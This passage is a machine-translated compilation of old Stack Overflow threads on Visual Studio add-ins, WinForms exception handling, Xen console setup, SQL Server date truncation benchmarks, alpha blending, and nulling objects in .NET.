*   [Microsoft StyleCop](http://code.msdn.microsoft.com/sourceanalysis)（代码分析）
*   [JetBrains dotTrace](http://www.jetbrains.com/profiler/)（应用程序分析）
*   [Typemock Isolator](http://www.typemock.com/learn_about_typemock_isolator.html)（在单元测试中模拟）
*   [Roland Weigelt 的 GhostDoc](http://www.roland-weigelt.de/ghostdoc/)（代码文档）

* * *

## 回答 #55

> 赞同：1
> 
> 时间：2008-12-09T17:53:59.257

对于 C# 开发，我使用：

*   ReSharper，高度自定义，我编写了几十个自定义操作（更不用说奇怪但精彩的实时模板）
*   GhostDoc - 对于生成代码的后处理非常有用
*   源代码大纲
*   P/factor（一组内部开发的 VS 代码生成工具） - 请参见[此处的示例](http://www.codeproject.com/KB/codegen/decorators.aspx)
*   CodeGenUtils - 另一个用于代码生成的内部开发，可[在 CodePlex 上获得](http://www.codeplex.com/codegenutils)
*   SharpWizard - 用于快速原型制作的 VS 插件。支持高级生成的接口支持、运算符、模式、元数据。
*   Dependency Analyzer - 一个非常漂亮的工具（另一个内部开发），用于识别 CLR 属性之间的依赖关系。对于基于依赖图自动生成更改通知很有用。

除了这些，我还有几个 DSL 图形设计器用于特别困难的场景——例如，我有一个用于复杂多线程操作的 DSL，这些操作使用 Pulse & Wait 实现。

* * *

## 回答 #56

> 赞同：1
> 
> 时间：2009-04-07T22:32:04.160

我不喜欢 Visual Studio 书签，所以我使用 DPACK 来获得与 Delph IDE 提供的相同类型的书签。

[http://www.usysware.com/dpack/](http://www.usysware.com/dpack/)

* * *

## 回答 #57

> 赞同：1
> 
> 时间：2009-09-07T03:46:27.000

我最喜欢的是我工作的那个——Goanna。:)

[http://www.redlizards.com/](http://www.redlizards.com/)

C/C++ 静态分析 - 它有助于发现错误。

* * *

## 回答 #58

> 赞同：1
> 
> 时间：2009-12-17T14:20:01.193

这里有一些我没有找到（或发现）提到：

*   ASPXEditHelper（ASP.NET 开发人员必备）
*   鼠标手势
*   代码保持
*   敲门声
*   Git 扩展

有人提到了 SQL 提示，所以我会添加 SQL 助手（价格相似，但功能更多）

很少有人提到 DPack 是免费的，而且绝对很棒。

此外，真正获得 ReSharper 或类似的东西（它会支付很多倍的费用）。裸 VS 只是不“比较”;-)

享受你的编码！

* * *

## 回答 #59

> 赞同：1
> 
> 时间：2009-12-17T14:29:15.713

[构建版本增量](http://autobuildversion.codeplex.com/)(GPL) 为您（几乎）提供了控制程序集版本所需的一切。

一些功能（从网站复制）：

*   可以为每个主要、次要、构建或修订号设置不同的自动增量样式。
*   支持 C#、VB.NET 和 C++.NET 项目。
*   不需要所有项目成员都安装。配置通过解决方案和项目文件中的属性共享。没有插件的开发人员不会有任何感觉。
*   如果在源代码控制下，自动签出所需的文件。
*   可以为每个解决方案和/或每个项目配置。
*   可以配置为仅在某些配置构建（调试、发布、任何或自定义）上更新
*   可以更新外部源文件中的程序集属性，而不是默认的 AssemblyInfo。

* * *

## 回答 #60

> 赞同：0
> 
> 时间：2008-08-18T18:59:31.370

*   Resharper（同意它很糟糕，你必须支付额外的费用才能得到这个，但好好赚钱）
*   GhostDoc（消除您的代码中没有注释的任何借口）

*   PowerCommands for VS 2008（忘了我什至安装了这个，因为它只是添加了一些本来应该一直存在的小东西）

* * *

## 回答 #61

> 赞同：0
> 
> 时间：2008-09-09T12:25:05.623

除了此处列出的重构和源代码控制工具之外，[AQTime](http://www.automatedqa.com/products/aqtime/)还是一个出色的 Windows 分析器。它可以作为插件运行或独立运行，并且可以与 .NET 和本机代码一起使用。

* * *

## 回答 #62

> 赞同：0
> 
> 时间：2008-09-12T10:12:58.740

[XPathmania](http://donxml.com/allthingstechie/archive/2006/07/07/2792.aspx)是一个很好的小工具，用于编写和测试 XPath 查询。

* * *

## 回答 #63

> 赞同：0
> 
> 时间：2008-09-16T19:36:39.570

[更好的插件管理器](http://www.codeproject.com/KB/cpp/vs2005addinmgr.aspx)

* * *

## 回答 #64

> 赞同：0
> 
> 时间：2008-09-16T19:37:42.797

[项目 MRU 编辑器](http://www.codeproject.com/KB/dotnet/VSProjectListEditor.aspx)

* * *

## 回答 #65

> 赞同：0
> 
> 时间：2008-09-16T19:39:40.840

[CodePlotter](http://www.codeproject.com/KB/macros/codeplotter.aspx)和[CodePlotter 重新混合](http://www.codeproject.com/KB/applications/codeplotterremoded.aspx)

* * *

## 回答 #66

> 赞同：0
> 
> 时间：2008-09-16T19:43:58.520

[Code Style Enforcer](http://joel.fjorden.se/static.php?page=CodeStyleEnforcer) 允许您定义 .NET 代码样式（具有一定程度的灵活性）并在违规处加下划线。具有上下文菜单选项来更改代码以匹配样式。需要从 Code Style Enforcer 页面链接的 DXCore。两者都是免费的。

* * *

## 回答 #67

> 赞同：0
> 
> 时间：2008-09-16T19:54:18.420

[PInvoke.NET 插件](http://www.pinvoke.net) 菜单用于搜索预先编写的 P/Invoke 代码。比自己编写编组代码要容易得多，尤其是当有讨厌的联合和对齐要求时。

* * *

## 回答 #68

> 赞同：0
> 
> 时间：2008-09-16T19:54:49.337

如果您正在寻找更好的代码编辑器，vim 附带 VisVim，这是一个用 vim 替换 VS 代码编辑器的插件。

* * *

## 回答 #69

> 赞同：0
> 
> 时间：2008-09-16T20:20:04.270

[VS 命令外壳](http://www.codeplex.com/Wiki/View.aspx?ProjectName=VSCmdShell) 输出窗格中的命令外壳。远非完美，但通常非常非常有用。比单独的 cmd 更快、更容易访问，并且具有更轻松的复制/粘贴支持。

* * *

## 回答 #70

> 赞同：0
> 
> 时间：2008-09-16T20:23:31.267

[用于评论的拼写检查器](http://blogs.msdn.com/mikhailarkhipov/archive/2007/12/31/spell-checker-update-2-1-a-few-bug-fixes-and-couple-of-new-features.aspx)是天赐之物。 [GhostDoc](http://www.roland-weigelt.de/ghostdoc/)非常适合制作有据可查的 API。

* * *

## 回答 #71

> 赞同：0
> 
> 时间：2008-09-17T08:48:55.607

[TracExplorer](http://tracexplorer.devjavu.com/)非常适合将 Trac 与 VS 集成。

* * *

## 回答 #72

> 赞同：0
> 
> 时间：2008-09-18T16:24:31.777

它不是 Visual Studio 插件，但它是一个没有它我无法使用 Visual Studio 的工具......

[**ClipX**](http://bluemars.org/clipx/) - 它适用于普通剪贴板，但将条目保存到可搜索列表中，您可以像往常一样使用复制和粘贴，但您可以按 CTRL+SHIFT+V 并弹出列表。它适用于图像、文本等。它甚至在您重新启动计算机后仍然存在。

* * *

## 回答 #73

> 赞同：0
> 
> 时间：2008-09-20T19:13:57.583

我知道这不是 VS 加载项，但[SSMS](http://www.ssmstoolspack.com/)无论如何对于使用 MSSQL 的任何人都可能有用。

只是为了你想看到更多这样的情况检查[这个帖子](http://weblogs.sqlteam.com/mladenp/archive/2007/11/20/Free-SQL-Server-tools-that-might-make-your-life-a.aspx)。实际上来自 ssmstoolspack 创建者。

* * *

## 回答 #74

> 赞同：0
> 
> 时间：2008-12-09T17:38:47.447

虽然 Visual SVN 的价格在 50 美元左右，但我更喜欢它而不是 AnkhSVN（我上一次尝试是在大约一年前 - 从那以后它可能已经有所改进）。

如果资金有问题，这是最容易卖给老板的方法之一。（谢天谢地，在我工作的地方，我们不必为了得到好的工具而抓挠。）

* * *

## 回答 #75

> 赞同：0
> 
> 时间：2009-01-04T10:40:08.700

我写的一个[http://www.codeplex.com/lazy](http://www.codeplex.com/lazy)

* * *

## 回答 #76

> 赞同：0
> 
> 时间：2009-05-18T03:57:56.853

DevExtra - 但我有偏见，因为我写了它:)

[http://www.toptensoftware.com/devextra/](http://www.toptensoftware.com/devextra/)

它现在有点老了（起源于 VC6），主要面向 C++ 开发人员，但它是免费的，我仍然每天都在使用它。

* * *

## 回答 #77

> 赞同：0
> 
> 时间：2010-03-22T14:16:33.670

Quick Open File 是一个来自 Eclipse 背景的插件，我离不开它

[http://kutny.net/vsopen/](http://kutny.net/vsopen/)

不再需要通过解决方案资源管理器来尝试查找文件

# winforms - winforms控制的全局异常处理

> ID：2770
> 
> 赞同：34
> 
> 时间：2008-08-05T20:05:22.077
> 
> 标签：winforms, error-handling, user-controls

在处理 ASP.NET 1.1 项目时，我总是使用 Global.asax 来捕获所有错误。我正在寻找一种类似的方法来捕获 Windows 窗体用户控件中的所有异常，该控件最终成为托管的 IE 控件。做这样的事情的正确方法是什么？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2008-08-05T20:11:45.340

您需要处理`System.Windows.Forms.Application.ThreadException`Windows 窗体的事件。这篇文章真的帮助了我：[http](http://bytes.com/forum/thread236199.html) ://bytes.com/forum/thread236199.html 。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2008-08-05T20:42:31.020

目前在我的 winforms 应用程序中，我有处理程序`Application.ThreadException`，如上所述，但也`AppDomain.CurrentDomain.UnhandledException`

大多数异常是通过`ThreadException`处理程序到达的，但根据我的经验，AppDomain 也遇到了一些异常

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-08-05T20:16:26.127

如果您使用的是 VB.NET，则可以使用非常方便的 ApplicationEvents.vb。该文件随 VB.NET WinForms 项目免费提供，并包含处理[未处理异常](http://msdn.microsoft.com/en-us/library/3a02k5s0(VS.80).aspx)的方法。

要访问这个漂亮的文件，它是“项目属性 >> 应用程序 >> 应用程序事件”

如果您不使用 VB.NET，那么是的，它正在处理[Application.ThreadException](http://msdn.microsoft.com/en-us/library/system.windows.forms.application.threadexception.aspx)。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2015-05-19T11:36:04.120

全局处理异常...

**Windows 应用程序**

System.Windows.Forms.Application.ThreadException 事件

*一般用于主方法。参考[MSDN 线程异常](https://msdn.microsoft.com/en-us/library/system.windows.forms.application.threadexception.aspx)*

**网络**

System.Web.HttpApplication.Error 事件

*通常用于 Global.asax 文件。请参阅[MSDN Global.asax 全局处理程序](https://msdn.microsoft.com/en-us/library/24395wz3(v=vs.140).aspx)*

**控制台应用程序**

System.AppDomain.UnhandledException 事件

*一般用于主方法。参考[MSDN UnhandledException](https://msdn.microsoft.com/en-us/library/system.appdomain.unhandledexception.aspx)*

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-09-27T21:55:24.050

来自 MSDN 的代码：http: [//msdn.microsoft.com/en-us/library/system.appdomain.unhandledexception.aspx ?cs-save-lang=1&cs-lang=vb#code-snippet-2](http://msdn.microsoft.com/en-us/library/system.appdomain.unhandledexception.aspx?cs-save-lang=1&cs-lang=vb#code-snippet-2)

```
Sub Main()
  Dim currentDomain As AppDomain = AppDomain.CurrentDomain
  AddHandler currentDomain.UnhandledException, AddressOf MyHandler

  Try 
     Throw New Exception("1")
  Catch e As Exception
     Console.WriteLine("Catch clause caught : " + e.Message)
     Console.WriteLine()
  End Try 

  Throw New Exception("2")
End Sub 

Sub MyHandler(sender As Object, args As UnhandledExceptionEventArgs)
  Dim e As Exception = DirectCast(args.ExceptionObject, Exception)
  Console.WriteLine("MyHandler caught : " + e.Message)
  Console.WriteLine("Runtime terminating: {0}", args.IsTerminating)
End Sub 
```

# ubuntu - 无法获得虚拟机的控制台

> ID：2773
> 
> 赞同：7
> 
> 时间：2008-08-05T20:06:18.673
> 
> 标签：ubuntu, virtualization, xen

我已经遵循了这个关于让 Xen 与 Ubuntu 一起工作的[优秀教程](http://howtoforge.com/ubuntu-8.04-server-install-xen-from-ubuntu-repositories)，但我无法在我的虚拟机 (domU) 中安装控制台。我的`extra = '2 console=xvc0'`/etc/xen/ **hostname_here** .cfg 文件中有一行，就像他们说的那样，但我无法在上面找到控制台。

如果我静态地为虚拟机分配一个 IP，我可以通过 SSH 连接到它，但现在我需要能够使用 DHCP 给它一个地址（因为这是我要调试的，所以问题就来了）。我知道我有一个免费的 DHCP 地址（虽然我现在得到更多），所以我不认为这是问题所在。我在谷歌和 Xen 论坛上也无济于事。

有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-08-05T21:27:45.763

在 8.04 之前，我按照不同的教程在 ubuntu 上设置我的 xen，但现在升级到 8.04。我在我的 cfg 中使用了额外的行，如下所示：

```
extra = ' TERM=xterm xencons=tty console=tty1' 
```

它允许我从 dom0 中“xm 控制台主机名”。我认为这是由于 8.04 之前版本中的 xen 设置存在问题（我不确定那是哪个版本）。我不确定在 8.04 中是否需要进行相同的更改，因为我是升级版并且在升级后没有更改我的任何 domU 配置。

# sql-server - 如何删除日期时间值的时间部分（SQL Server）？

> ID：2775
> 
> 赞同：85
> 
> 时间：2008-08-05T20:08:38.653
> 
> 标签：sql-server, datetime, date-conversion

这是我使用的：

```
SELECT CAST(FLOOR(CAST(getdate() as FLOAT)) as DATETIME) 
```

我在想可能有更好更优雅的方式。

要求：

*   它必须尽可能快（铸造越少越好）。
*   最终结果必须是`datetime`类型，而不是字符串。

* * *

## 回答 #1

> 赞同：117
> 
> 时间：2010-09-12T22:57:35.493

**SQL Server 2008 及更高版本**

在 SQL Server 2008 及更高版本中，最快的方法当然是`Convert(date, @date)`. 如有必要，可以将其转换回 a`datetime`或。`datetime2`

**SQL Server 2005 及更早版本中真正最好的是什么？**

我已经看到关于在 SQL Server 中截断日期的时间最快的方法的说法不一致，有些人甚至说他们进行了测试，但我的经验有所不同。所以让我们做一些更严格的测试，让每个人都有脚本，这样如果我犯了任何错误，人们可以纠正我。

**浮点转换不准确**

首先，我会远离转换`datetime`为`float`，因为它不能正确转换。您可以准确地执行时间删除操作，但我认为使用它是一个坏主意，因为它隐含地向开发人员传达了这是一个安全的操作，**而不是**. 看一看：

```
declare @d datetime;
set @d = '2010-09-12 00:00:00.003';
select Convert(datetime, Convert(float, @d));
-- result: 2010-09-12 00:00:00.000 -- oops 
```

这不是我们应该在我们的代码或在线示例中教给人们的东西。

而且，这甚至不是最快的方法！

**证明——性能测试**

如果您想自己执行一些测试以了解不同的方法实际上是如何叠加的，那么您将需要这个设置脚本来进一步运行测试：

```
create table AllDay (Tm datetime NOT NULL CONSTRAINT PK_AllDay PRIMARY KEY CLUSTERED);
declare @d datetime;
set @d = DateDiff(Day, 0, GetDate());
insert AllDay select @d;
while @@ROWCOUNT != 0
   insert AllDay
   select * from (
      select Tm =
         DateAdd(ms, (select Max(DateDiff(ms, @d, Tm)) from AllDay) + 3, Tm)
      from AllDay
   ) X
   where Tm < DateAdd(Day, 1, @d);
exec sp_spaceused AllDay;  -- 25,920,000 rows 
```

请注意，这会在您的数据库中创建一个 427.57 MB 的表，运行大约需要 15-30 分钟。如果您的数据库很小并且设置为 10% 的增长，那么它需要的时间比您先设置足够大的情况要长。

现在为实际的性能测试脚本。请注意，不将行返回给客户端是有目的的，因为这在 2600 万行上非常昂贵，并且会隐藏方法之间的性能差异。

**性能结果**

```
set statistics time on;
-- (All queries are the same on io: logical reads 54712)
GO
declare
    @dd date,
    @d datetime,
    @di int,
    @df float,
    @dv varchar(10);

-- Round trip back to datetime
select @d = CONVERT(date, Tm) from AllDay; -- CPU time = 21234 ms,  elapsed time = 22301 ms.
select @d = CAST(Tm - 0.50000004 AS int) from AllDay; -- CPU = 23031 ms, elapsed = 24091 ms.
select @d = DATEDIFF(DAY, 0, Tm) from AllDay; -- CPU = 23782 ms, elapsed = 24818 ms.
select @d = FLOOR(CAST(Tm as float)) from AllDay; -- CPU = 36891 ms, elapsed = 38414 ms.
select @d = CONVERT(VARCHAR(8), Tm, 112) from AllDay; -- CPU = 102984 ms, elapsed = 109897 ms.
select @d = CONVERT(CHAR(8), Tm, 112) from AllDay; -- CPU = 103390 ms,  elapsed = 108236 ms.
select @d = CONVERT(VARCHAR(10), Tm, 101) from AllDay; -- CPU = 123375 ms, elapsed = 135179 ms.

-- Only to another type but not back
select @dd = Tm from AllDay; -- CPU time = 19891 ms,  elapsed time = 20937 ms.
select @di = CAST(Tm - 0.50000004 AS int) from AllDay; -- CPU = 21453 ms, elapsed = 23079 ms.
select @di = DATEDIFF(DAY, 0, Tm) from AllDay; -- CPU = 23218 ms, elapsed = 24700 ms
select @df = FLOOR(CAST(Tm as float)) from AllDay; -- CPU = 29312 ms, elapsed = 31101 ms.
select @dv = CONVERT(VARCHAR(8), Tm, 112) from AllDay; -- CPU = 64016 ms, elapsed = 67815 ms.
select @dv = CONVERT(CHAR(8), Tm, 112) from AllDay; -- CPU = 64297 ms,  elapsed = 67987 ms.
select @dv = CONVERT(VARCHAR(10), Tm, 101) from AllDay; -- CPU = 65609 ms, elapsed = 68173 ms.
GO
set statistics time off; 
```

**一些杂乱无章的分析**

关于这一点的一些注释。首先，如果只是执行 GROUP BY 或比较，则无需转换回`datetime`. 因此，您可以通过避免这种情况来节省一些 CPU，除非您需要最终值用于显示目的。您甚至可以 GROUP BY 未转换的值并将转换仅放在 SELECT 子句中：

```
select Convert(datetime, DateDiff(dd, 0, Tm))
from (select '2010-09-12 00:00:00.003') X (Tm)
group by DateDiff(dd, 0, Tm) 
```

另外，看看数字转换如何只需要稍微多一点的时间来转换回`datetime`，但`varchar`转换几乎翻了一番？这揭示了查询中专门用于日期计算的 CPU 部分。有部分 CPU 使用率不涉及日期计算，在上述查询中这似乎接近 19875 毫秒。然后转换需要一些额外的金额，因此如果有两次转换，该金额大约会用完两次。

更多检查表明，与 相比`Convert(, 112)`，`Convert(, 101)`查询有一些额外的 CPU 开销（因为它使用更长的`varchar`？），因为第二次转换回的`date`成本没有初始转换到 的成本`varchar`，但`Convert(, 112)`更接近相同的 20000 ms CPU 基本成本。

以下是我用于上述分析的 CPU 时间计算：

```
 method   round  single   base
-----------  ------  ------  -----
       date   21324   19891  18458
        int   23031   21453  19875
   datediff   23782   23218  22654
      float   36891   29312  21733
varchar-112  102984   64016  25048
varchar-101  123375   65609   7843 
```

*   *round*是往返返回的 CPU 时间`datetime`。

*   *single*是单次转换为备用数据类型（具有删除时间部分的副作用）的 CPU 时间。

*   *base*`single`是从两次调用之间的差值中减去的计算： `single - (round - single)`. 这是一个假设与该数据类型之间的转换并且`datetime`在任一方向上大致相同的大致数字。看起来这个假设并不完美，但很接近，因为这些值都接近 20000 毫秒，只有一个例外。

一个更有趣的事情是，基本成本几乎等于单一`Convert(date)`方法（它必须几乎是 0 成本，因为服务器可以在内部直接从`datetime`数据类型的前四个字节中提取整数天部分）。

**结论**

所以看起来是单向`varchar`转换方法大约需要 1.8 μs，而单向转换方法大约`DateDiff`需要 0.18 μs。在我对 25,920,000 行总共 18458 毫秒的测试中，我将此基于最保守的“基本 CPU”时间，因此 23218 毫秒 / 25920000 = 0.18 微秒。明显的 10 倍改进似乎很多，但坦率地说，在处理数十万行之前它非常小（617k 行 = 1 秒节省）。

在我看来，即使有这么小的绝对改进，该`DateAdd`方法还是会获胜，因为它是性能和清晰度的最佳组合。需要“神奇数字”的答案`0.50000004`总有一天会咬人（五个零或六个？？？），而且更难理解。

**补充笔记**

当我有时间时，我将更`0.50000004`改为`'12:00:00.003'`，看看它是如何做的。它被转换为相同的`datetime`值，我发现它更容易记住。

对于那些感兴趣的人，上述测试是在@@Version 返回以下内容的服务器上运行的：

> Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (Intel X86) Jul 9 2008 14:43:34 版权所有 (c) 1988-2008 Microsoft Corporation Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)

* * *

## 回答 #2

> 赞同：30
> 
> 时间：2008-08-06T06:44:32.600

SQL Server 2008 有一个新的[**日期**数据类型](http://msdn.microsoft.com/en-us/library/bb630352.aspx)，这将这个问题简化为：

```
SELECT CAST(CAST(GETDATE() AS date) AS datetime) 
```

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2008-08-06T08:06:19.720

Itzik Ben-Gan 在[DATETIME Calculations, Part 1](https://www.itprotoday.com/analytics-and-reporting/datetime-calculations-part-1)（SQL Server 杂志，2007 年 2 月）中展示了执行这种转换的三种方法（从**最慢到最快**；第二种和第三种方法之间的差异很小）：

```
SELECT CAST(CONVERT(char(8), GETDATE(), 112) AS datetime)

SELECT DATEADD(day, DATEDIFF(day, 0, GETDATE()), 0)

SELECT CAST(CAST(GETDATE() - 0.50000004 AS int) AS datetime) 
```

您的技术（casting to *float*）是由该杂志四月号的一位读者推荐的。据他介绍，它的性能可与上述第二种技术相媲美。

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2008-08-05T20:12:29.037

您的`CAST`- `FLOOR`-`CAST`似乎已经是最佳方式，至少在 MS SQL Server 2005 上。

我见过的其他一些解决方案有一个字符串转换，就像`Select Convert(varchar(11), getdate(),101)`它们一样，它慢了 10 倍。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2013-06-29T09:49:05.130

请试试：

```
SELECT CONVERT(VARCHAR(10),[YOUR COLUMN NAME],105) [YOURTABLENAME] 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-11-05T04:26:40.977

SQL2005：我建议使用 cast 而不是 dateadd。例如，

```
select cast(DATEDIFF(DAY, 0, datetimefield) as datetime) 
```

在我的数据集上平均*快*10% ，比

```
select DATEADD(DAY, DATEDIFF(DAY, 0, datetimefield), 0) 
```

（并且转换为 smalldatetime 仍然更快）

# c# - 使用 alpha 混合将 ARBG 转换为 RGB

> ID：2780
> 
> 赞同：25
> 
> 时间：2008-08-05T20:12:20.487
> 
> 标签：c#, colors

假设我们有一个 ARGB 颜色：

```
Color argb = Color.FromARGB(127, 69, 12, 255); //Light Urple. 
```

当这被涂在现有颜色的顶部时，颜色将混合。所以当它与白色混合时，得到的颜色是`Color.FromARGB(255, 162, 133, 255);`

解决方案应该像这样工作：

```
Color blend = Color.White; 
Color argb = Color.FromARGB(127, 69, 12, 255); //Light Urple.      
Color rgb = ToRGB(argb, blend); //Same as Color.FromARGB(255, 162, 133, 255); 
```

什么是`ToRGB`执行？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2008-08-05T20:16:03.583

它被称为[阿尔法混合](http://en.wikipedia.org/wiki/Alpha_compositing)。

在伪代码中，假设背景颜色（混合）始终具有 255 alpha。还假设 alpha 为 0-255。

```
alpha=argb.alpha()
r = (alpha/255)*argb.r() + (1 - alpha/255)*blend.r()
g = (alpha/255)*argb.g() + (1 - alpha/255)*blend.g()
b = (alpha/255)*argb.b() + (1 - alpha/255)*blend.b() 
```

*注意：您可能需要对浮点/整数数学和舍入问题更加小心，具体取决于语言。相应地铸造中间体*

**编辑添加：**

如果您没有 alpha 为 255 的背景颜色，则代数会变得更加复杂。我以前做过，这对读者来说是一个有趣的练习（如果你真的需要知道，问另一个问题:)。

换句话说，什么颜色 C 混合到某个背景中，就像混合 A，然后混合 B。这有点像计算 A+B（与 B+A 不同）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-06-26T10:52:29.007

我知道这是一个旧线程，但我想添加这个：

```
Public Shared Function AlphaBlend(ByVal ForeGround As Color, ByVal BackGround As Color) As Color
    If ForeGround.A = 0 Then Return BackGround
    If BackGround.A = 0 Then Return ForeGround
    If ForeGround.A = 255 Then Return ForeGround
    Dim Alpha As Integer = CInt(ForeGround.A) + 1
    Dim B As Integer = Alpha * ForeGround.B + (255 - Alpha) * BackGround.B >> 8
    Dim G As Integer = Alpha * ForeGround.G + (255 - Alpha) * BackGround.G >> 8
    Dim R As Integer = Alpha * ForeGround.R + (255 - Alpha) * BackGround.R >> 8
    Dim A As Integer = ForeGround.A

    If BackGround.A = 255 Then A = 255
    If A > 255 Then A = 255
    If R > 255 Then R = 255
    If G > 255 Then G = 255
    If B > 255 Then B = 255

    Return Color.FromArgb(Math.Abs(A), Math.Abs(R), Math.Abs(G), Math.Abs(B))
End Function

public static Color AlphaBlend(Color ForeGround, Color BackGround)
{
    if (ForeGround.A == 0)
        return BackGround;
    if (BackGround.A == 0)
        return ForeGround;
    if (ForeGround.A == 255)
        return ForeGround;

    int Alpha = Convert.ToInt32(ForeGround.A) + 1;
    int B = Alpha * ForeGround.B + (255 - Alpha) * BackGround.B >> 8;
    int G = Alpha * ForeGround.G + (255 - Alpha) * BackGround.G >> 8;
    int R = Alpha * ForeGround.R + (255 - Alpha) * BackGround.R >> 8;
    int A = ForeGround.A;

    if (BackGround.A == 255)
        A = 255;
    if (A > 255)
        A = 255;
    if (R > 255)
        R = 255;
    if (G > 255)
        G = 255;
    if (B > 255)
        B = 255;

    return Color.FromArgb(Math.Abs(A), Math.Abs(R), Math.Abs(G), Math.Abs(B));
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-08-06T06:39:12.173

如果你不需要知道这个预渲染，你总是可以使用 getpixel 的 win32 方法，我相信。

注意：在密苏里州中部的 iPhone 上打字，没有 inet 访问权限。将查找真正的 win32 示例并查看是否有 .net 等价物。

如果有人关心，并且不想使用上面发布的（优秀）答案，您可以通过此链接[MSDN 示例获取 .Net 中像素的颜色值](http://msdn.microsoft.com/en-us/library/system.drawing.bitmap.getpixel.aspx)

# c# - Setting Objects to Null/Nothing after use in .NET

> ID：2785
> 
> 赞同：191
> 
> 时间：2008-08-05T20:14:10.560
> 
> 标签：c#, .net, vb.net, memory-management, null

Should you set all the objects to `null` (`Nothing` in VB.NET) once you have finished with them?

I understand that in .NET it is essential to dispose of any instances of objects that implement the `IDisposable` interface to release some resources although the object can still be something after it is disposed (hence the `isDisposed` property in forms), so I assume it can still reside in memory or at least in part?

I also know that when an object goes out of scope it is then marked for collection ready for the next pass of the garbage collector (although this may take time).

So with this in mind will setting it to `null` speed up the system releasing the memory as it does not have to work out that it is no longer in scope and are they any bad side effects?

MSDN articles never do this in examples and currently I do this as I cannot see the harm. However I have come across a mixture of opinions so any comments are useful.

* * *

## 回答 #1

> 赞同：73
> 
> 时间：2008-08-05T20:56:28.667

Karl is absolutely correct, there is no need to set objects to null after use. If an object implements `IDisposable`, just make sure you call `IDisposable.Dispose()` when you're done with that object (wrapped in a `try`..`finally`, or, a `using()` block). But even if you don't remember to call `Dispose()`, the finaliser method on the object should be calling `Dispose()` for you.

I thought this was a good treatment:

> [Digging into IDisposable](http://web.archive.org/web/20090311003201/http://msdn.microsoft.com/en-us/magazine/cc163392.aspx)

and this

> [Understanding IDisposable](http://web.archive.org/web/20090426210049/www.marcclifton.com/tabid/79/Default.aspx)

There isn't any point in trying to second guess the GC and its management strategies because it's self tuning and opaque. There was a good discussion about the inner workings with Jeffrey Richter on Dot Net Rocks here: [Jeffrey Richter on the Windows Memory Model](http://www.dotnetrocks.com/default.aspx?showNum=361) and Richters book [CLR via C#](http://amzn.eu/d/aitTG0A) chapter 20 has a great treatment:

* * *

## 回答 #2

> 赞同：37
> 
> 时间：2008-08-15T14:43:34.930

Another reason to avoid setting objects to null when you are done with them is that it can actually keep them alive for longer.

e.g.

```
void foo()
{
    var someType = new SomeType();
    someType.DoSomething();
    // someType is now eligible for garbage collection         

    // ... rest of method not using 'someType' ...
} 
```

will allow the object referred by someType to be GC'd after the call to "DoSomething" but

```
void foo()
{
    var someType = new SomeType();
    someType.DoSomething();
    // someType is NOT eligible for garbage collection yet
    // because that variable is used at the end of the method         

    // ... rest of method not using 'someType' ...
    someType = null;
} 
```

may sometimes keep the object alive until the end of the method. The [JIT will usually optimized away the assignment to null](http://blogs.msdn.com/clyon/archive/2004/12/01/273144.aspx), so both bits of code end up being the same.

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2008-08-05T20:23:33.477

No don't null objects. You can check out [https://web.archive.org/web/20160325050833/http://codebetter.com/karlseguin/2008/04/28/foundations-of-programming-pt-7-back-to-basics-memory/](https://web.archive.org/web/20160325050833/http://codebetter.com/karlseguin/2008/04/28/foundations-of-programming-pt-7-back-to-basics-memory/) for more information, but setting things to null won't do anything, except dirty your code.

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-08-09T11:16:04.837

In general, there's no need to null objects after use, but in some cases I find it's a good practice.

If an object implements IDisposable and is stored in a field, I think it's good to null it, just to avoid using the disposed object. The bugs of the following sort can be painful:

```
this.myField.Dispose();
// ... at some later time
this.myField.DoSomething(); 
```

It's good to null the field after disposing it, and get a NullPtrEx right at the line where the field is used again. Otherwise, you might run into some cryptic bug down the line (depending on exactly what DoSomething does).

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2008-08-09T12:13:12.553

Chances are that your code is not structured tightly enough if you feel the need to *`null`* variables.

There are a number of ways to limit the scope of a variable:

As mentioned by **Steve Tranby**

```
using(SomeObject object = new SomeObject()) 
{
  // do stuff with the object
}
// the object will be disposed of 
```

Similarly, you can simply use curly brackets:

```
{
    // Declare the variable and use it
    SomeObject object = new SomeObject()
}
// The variable is no longer available 
```

I find that using curly brackets without any "heading" to really clean out the code and help make it more understandable.

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2008-08-05T20:37:30.063

Also:

```
using(SomeObject object = new SomeObject()) 
{
  // do stuff with the object
}
// the object will be disposed of 
```

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2008-08-05T20:32:48.153

The only time you should set a variable to null is when the variable does not go out of scope and you no longer need the data associated with it. Otherwise there is no need.

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2012-04-17T08:55:49.503

In general no need to set to null. But suppose you have a Reset functionality in your class.

Then you might do, because you do not want to call dispose twice, since some of the Dispose may not be implemented correctly and throw System.ObjectDisposed exception.

```
private void Reset()
{
    if(_dataset != null)
    {
       _dataset.Dispose();
       _dataset = null;
    }
    //..More such member variables like oracle connection etc. _oraConnection
 } 
```

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2012-04-11T01:12:07.903

this kind of "there is no need to set objects to null after use" is not entirely accurate. There are times you need to NULL the variable after disposing it.

Yes, you should ALWAYS call `.Dispose()` or `.Close()` on anything that has it when you are done. Be it file handles, database connections or disposable objects.

Separate from that is the very practical pattern of LazyLoad.

Say I have and instantiated `ObjA` of `class A`. `Class A` has a public property called `PropB` of `class B`.

